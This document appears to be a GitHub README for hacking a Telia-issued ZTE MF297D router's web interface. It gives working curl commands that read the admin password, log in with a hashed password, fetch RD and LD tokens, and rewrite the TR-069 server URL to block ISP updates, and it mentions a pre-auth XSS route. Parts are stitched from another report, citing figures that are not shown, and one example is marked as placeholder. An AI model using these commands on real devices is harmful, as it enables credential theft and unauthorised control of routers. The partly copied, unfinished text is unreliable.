# ZTE-MF297D_Nordic1_B0X-WPA3

The really first wiki online for hacking the router firmware used by (Telia_ZTE_-_MF297D) delivered from ZTE. This repo will be updated very often from today's date (2022-06-11), I choose to post everything here instead of reporting cve's, as usual! I start today and we'll see how it goes, lets begin.! :)

Alright, I just got the router `2022-06-11` and I saw Daniel Wong is the only guy that reported a cryptographic issues vulnerability so now we have to find a way to hurry to turn off the upgrade from 2022-06-09! No worries, I got you covered! I will add everything I find, I will rewrite this wiki when I  there is time:)

### Router Info

I didn't add any WAN cable yet, first thing i did was to unscrew the router of course. It is brand new really! :)

My current firmware version is: `MF297D_Nordic1_B05` - All Telia routers will be shipped with this firmware I guess.

### Telia Version

![Screenshot_20220611_123128](https://user-images.githubusercontent.com/26827453/173184189-ecc6ad08-7e0e-4a44-bfc9-d88ec4c8be3c.png)

### Getting Started

Alright, first we want is to DISABLE the autoupgrade so we will not upgrade from `MF297D_Nordic1_B05` -> `MF297D_Nordic1_B06`, 
they forgot to disable access to tr69 it seems so turn off auto upgrade ASAP! 


###### WebToken

We need to add an additional requirement more when we decide to communicate with the “/goform/goform_set_cmd_process” endpoint (Figure 24).
There is a function called at `AD_hash_check_and_allowedlist`

Depending on how strong the randomness of the `RD` value is, we could try to brute-force it, but we won’t focus on that here. Using pre-auth `XSS`, we can obtain RD value sending the request in Figure 27 and calculate the `AD` value. This function will return true also when the “goformId” value is one of the entries in the `g_set_commands_v`” array. If we choose one of these `ID`s, we don't need to care about the `AD` parameter in our request. After examining all related handlers for the above form `ID`s, something interesting stood out.



### Developer Console (Temp Not Real Commands For TOKEN)
![Screenshot_20220821_003552](https://user-images.githubusercontent.com/26827453/185768301-014e55c1-cb8c-4368-bad6-bcef9243451c.png)

* Example usage, to be updated

```json
rd0
'BD_TELIASEMF297DMODV1.0.0B03 [Jan  5 2022 18:02:19]'
```

```json
rd1
'MF297D_Nordic1_B05'
```

```json
var AD_test=rd1+rd0
```

```json
SHA256('AD_test')
'C7BF4BBDBCD88D9D7F7C7B299C94E9E52091AF2FD2888ECF85A9D6A4160B4184'
```
```json
b64_md5('AD_test')
'4YLrvBZtczZueYaBOn/F8Q'
```

### Login on router, no other methods works and the ones around the web is old, do as below for login:

##### Get Password for using instead of AD WebToken for Curl :)

```bash
admin_Password=$(curl -sL 'http://192.168.32.1/goform/goform_get_cmd_process?isTest=false&cmd=admin_Password' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.9,sv;q=0.8' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: zwsd="9db95bed7fecf8c4305252a4f6e12411"' \
  -H 'Referer: http://192.168.32.1/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure|jq)
  
   echo $admin_Password|cut -d'"' -f4
```

##### Simple Login Via Password

![admin_password](https://user-images.githubusercontent.com/26827453/185767478-f6b3bc48-cdc5-4178-b306-c7d458b6cb79.png)

```bash
curl -sL 'http://192.168.32.1/goform/goform_set_cmd_process'   \
      -H 'Accept: application/json, text/javascript, */*; q=0.01'   \
      -H 'Accept-Language: en-US,en;q=0.9,sv;q=0.8' \
      -H 'Connection: keep-alive'     \
      -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'    \
      -H 'Origin: http://192.168.32.1'   \
      -H 'Referer: http://192.168.32.1/'    \
      -H 'Cookie: zwsd="8bb88f80d334b1869781beb89f7b73be' \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'   \
      -H 'X-Requested-With: XMLHttpRequest'    \
      --data-raw 'isTest=false&goformId=LOGIN&password=506F30DEDC18694E4F2A347033BD5FC1D07389C7CB7970BA804FC4EB3DF604E8'|jq
```

### Set WebLanguage via Password instead of WebToken

![success](https://user-images.githubusercontent.com/26827453/185767477-2160419c-62fa-41f2-bb43-653b5c4b1dae.png)

```bash
curl -sL 'http://192.168.32.1/goform/goform_set_cmd_process'   \
      -H 'Accept: application/json, text/javascript, */*; q=0.01'   \
      -H 'Accept-Language: en-US,en;q=0.9,sv;q=0.8' \
      -H 'Connection: keep-alive'     \
      -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'    \
      -H 'Origin: http://192.168.32.1'   \
      -H 'Referer: http://192.168.32.1/'    \
      -H 'Cookie: zwsd="8bb88f80d334b1869781beb89f7b73be' \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'   \
      -H 'X-Requested-With: XMLHttpRequest'    \
      --data-raw 'isTest=false&goformId=SET_WEB_LANGUAGE&Language=sv&password=506F30DEDC18694E4F2A347033BD5FC1D07389C7CB7970BA804FC4EB3DF604E8'|jq
```

##### Generate RD Token

```bash
RD=$(curl 'http://192.168.32.1/goform/goform_get_cmd_process?isTest=false&cmd=RD&_=1660960608154' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.9,sv;q=0.8' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: zwsd="8bb88f80d334b1869781beb89f7b73be"' \
  -H 'Referer: http://192.168.32.1/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure|cut -d'"' -f4)

echo ${RD}
```

##### Generate LD Token

```bash
LD="$(curl 'http://192.168.32.1/goform/goform_get_cmd_process?isTest=false&cmd=LD&_=1655363462531' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://192.168.32.1/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure|cut -d'"' -f4)"
  
echo ${LD}
```

### Disable TR-069 via commandline

To avoid to upgrade to the newer version, turn off tr069 or edit the ACSURL (wich is hidden and disabled for us but they forgot to disable it)

```bash
curl 'http://192.168.32.1/goform/goform_set_cmd_process' -X POST \ 
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.32.1/' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'\
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: zwsd="<zwsd:_cookie>"' \
  --data-raw 'isTest=false&goformId=setTR069Config&serverURL=wusemanwasherehttps%3A%2F%2Frgw.teliacompany.com%3A7575%2FACS-server%2FACS&serverusername=&serveruserpassword=&tr069_CPEPortNo=7547&connrequestname=&connrequestpassword=&tr069_PeriodicInformEnable=0&tr069_PeriodicInformInterval=99500&tr069_CertEnable=1&AD=<token>'
```

### Print Access Control ACL Mode (Default: 2)

```bash
curl 'http://192.168.32.1/goform/goform_get_cmd_process?cmd=queryDeviceAccessControlList' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.9,sv;q=0.8' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: zwsd="9db95bed7fecf8c4305252a4f6e12411"' \
  -H 'Referer: http://192.168.32.1/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure
```

### Print Stuff for AD Token 

```bash
curl 'http://192.168.32.1/goform/goform_get_cmd_process?cmd=IOT_product_type%2Cloginfo%2Cmanufacturer%2Cmodel_name%2Cproduct_type%2Cwa_inner_version%2Cweb_api_version%2Cwifi_nv_api_version&multi_data=1' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.9,sv;q=0.8' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: zwsd="9db95bed7fecf8c4305252a4f6e12411"' \
  -H 'Referer: http://192.168.32.1/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --compressed \
  --insecure
```
```
{
  "IOT_product_type": "",
  "loginfo": "ok",
  "manufacturer": "",
  "model_name": "MF297D",
  "product_type": "CPE",
  "wa_inner_version": "BD_TELIASEMF297DMODV1.0.0B03 [Jan  5 2022 18:02:19]",
  "web_api_version": "",
  "wifi_nv_api_version": "2"
}
```



### Get Telnet info: 

![telnet](https://user-images.githubusercontent.com/26827453/173183876-fe01e47d-7973-48bd-aeb1-fde07da2207d.png)

### Config file is encrypted and salted, see below:

![Screenshot_20220611_060724](https://user-images.githubusercontent.com/26827453/173183897-9c243d9e-25f8-4718-b4a7-8e6a7985e7c9.png)

### CVE reports by others

| Date | Current Version    | Affected Version                            |  Fixed Version                          |
| :----------------- | :----------------- | :-------------------------------- | :----------------------------------|  
| 2022-06-09 | `MF297D`            |  MF297D_Nordic1_B05    | MF297D_Nordic1_B06                               |

ZTE's MF297D product has cryptographic issues vulnerability. 
Due to the use of weak random values, the security of the device is reduced, and it may face the risk of attack. 

https://www.cve.org/CVERecord?id=CVE-2022-23138

### Available WebUI Pages

```bash
cat menu4g.js \
  |grep -i hash\
  |sed 's/: "/http:\/\/192.168.32.1\/index.html/g'\
  |grep -o 'http.*"'\
  |cut -d'"' -f1
```

```
http://192.168.32.1/i18n/Messages_en.properties?v=1643166201485
http://192.168.32.1/index.html#login
http://192.168.32.1/index.html#change_password
http://192.168.32.1/index.html#mesh_building
http://192.168.32.1/index.html#home
http://192.168.32.1/index.html#status
http://192.168.32.1/index.html#sms
http://192.168.32.1/index.html#phonebook
http://192.168.32.1/index.html#parental_control
http://192.168.32.1/index.html#setting
http://192.168.32.1/index.html#suggested_position
http://192.168.32.1/index.html#internet_setting
http://192.168.32.1/index.html#mesh_network_setting
http://192.168.32.1/index.html#mesh_switch_wifi_setting
http://192.168.32.1/index.html#mesh_faq
http://192.168.32.1/index.html#mesh_add_sub_node
http://192.168.32.1/index.html#net_setting
http://192.168.32.1/index.html#wifi
http://192.168.32.1/index.html#device_setting
http://192.168.32.1/index.html#firewall
http://192.168.32.1/index.html#router_setting
http://192.168.32.1/index.html#bind_addr_autocomplete
http://192.168.32.1/index.html#bind_addr_lan
http://192.168.32.1/index.html#group_all
http://192.168.32.1/index.html#group_common
http://192.168.32.1/index.html#group_family
http://192.168.32.1/index.html#group_friend
http://192.168.32.1/index.html#group_colleague
http://192.168.32.1/index.html#device_info
http://192.168.32.1/index.html#traffic_statistics
http://192.168.32.1/index.html#traffic_alert
http://192.168.32.1/index.html#smslist
http://192.168.32.1/index.html#sms_setting
http://192.168.32.1/index.html#voip_setting
http://192.168.32.1/index.html#dial_setting
http://192.168.32.1/index.html#net_select
http://192.168.32.1/index.html#net_select_hide
http://192.168.32.1/index.html#apn_setting
http://192.168.32.1/index.html#wifi_basic
http://192.168.32.1/index.html#wifi_main
http://192.168.32.1/index.html#wifi_guest
http://192.168.32.1/index.html#station_info
http://192.168.32.1/index.html#wifi_advance
http://192.168.32.1/index.html#black_list
http://192.168.32.1/index.html#wps
http://192.168.32.1/index.html#wifi_main_ssid
http://192.168.32.1/index.html#wifi_mac_filter
http://192.168.32.1/index.html#wifi_main_chip1
http://192.168.32.1/index.html#wifi_main_chip2
http://192.168.32.1/index.html#wifi_beamforming_setting
http://192.168.32.1/index.html#mesh_ssid_setting
http://192.168.32.1/index.html#mesh_device_list
http://192.168.32.1/index.html#mesh_wps
http://192.168.32.1/index.html#wifi_mesh_guest
http://192.168.32.1/index.html#password_management
http://192.168.32.1/index.html#pin_management
http://192.168.32.1/index.html#restore
http://192.168.32.1/index.html#restart
http://192.168.32.1/index.html#SNTP
http://192.168.32.1/index.html#sys_log
http://192.168.32.1/index.html#tr069config
http://192.168.32.1/index.html#port_filter
http://192.168.32.1/index.html#url_filter
http://192.168.32.1/index.html#port_map
http://192.168.32.1/index.html#system_security
http://192.168.32.1/index.html#upnp
http://192.168.32.1/index.html#dmz
http://192.168.32.1/index.html#sleep_mode
http://192.168.32.1/index.html#others
http://192.168.32.1/index.html#pc_children_group
http://192.168.32.1/index.html#pc_time_limited
http://192.168.32.1/index.html#ota_update
http://192.168.32.1/index.html#network_info
http://192.168.32.1/index.html#diagnosis
http://192.168.32.1/index.html#thermal_switch
http://192.168.32.1/index.html#ping_log
http://192.168.32.1/index.html#sleep_protection_mode
http://192.168.32.1/index.html#restart_schedule
http://192.168.32.1/index.html#vpn_client
http://192.168.32.1/index.html#user_details
http://192.168.32.1/index.html#supplement_service
http://192.168.32.1/index.html#voip_settings
http://192.168.32.1/index.html#voip_advanced_settings
http://192.168.32.1/index.html#ap_station
http://192.168.32.1/index.html#temp_status
http://192.168.32.1/index.html#ant_switch
http://192.168.32.1/index.html#debug_page
http://192.168.32.1/index.html#rf_mmw
http://192.168.32.1/index.html#configuragtion
http://192.168.32.1/index.html#wifiChannel
http://192.168.32.1/index.html#wifiChannel5g
http://192.168.32.1/index.html#nfc_setting
http://192.168.32.1/index.html#ddns_settings
http://192.168.32.1/index.html#offline_info
http://192.168.32.1/index.html#port_trigger
http://192.168.32.1/index.html#sysInfo
http://192.168.32.1/index.html#lock_band_setting
http://192.168.32.1/index.html#change_mode
http://192.168.32.1/index.html#external_antenna
http://192.168.32.1/index.html#dns_settings
http://192.168.32.1/index.html#ulca_setting
```


### Awesome resources

* ![4G-Hotspots-For-Fun-Bugs-Net-Financial-Loss.pdf](https://github.com/wuseman/ZTE-MF297D_Nordic1_B0X-WPA3/files/9388063/4G-Hotspots-For-Fun-Bugs-Net-Financial-Loss.pdf)


* ![ZTE_Vulnerability.pdf](https://github.com/wuseman/ZTE-MF297D_Nordic1_B0X-WPA3/files/9388064/ZTE_Vulnerability.pdf)

# json files

[menu.txt](https://github.com/wuseman/ZTE-MF297D_Nordic1_B0X-WPA3/files/9388066/menu.txt)

[menu4g.js.txt](https://github.com/wuseman/ZTE-MF297D_Nordic1_B0X-WPA3/files/9388065/menu4g.js.txt)



# SORT BELOW

# ZTE PASS
![zte_pass](https://user-images.githubusercontent.com/26827453/185767755-334ede86-4a52-4ee0-b9ef-b4249d4e86d5.png)
